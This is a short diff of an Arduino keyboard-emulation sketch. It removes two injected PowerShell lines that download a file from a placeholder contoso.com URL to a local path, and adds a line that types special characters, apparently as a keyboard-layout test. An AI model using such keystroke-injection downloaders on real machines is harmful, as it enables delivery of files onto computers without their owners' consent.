@@ -8,8 +8,8 @@ void setup() {
 
   delay(1000);
   
-  Keyboard.println("$WebClient = New-Object System.Net.WebClient");
-  Keyboard.println("$WebClient.DownloadFile(\"https://www.contoso.com/file\",\"C:\\path\\file\")");
+  Keyboard.print("|@#{}[]()\"");
+
 }
 
 void loop() {
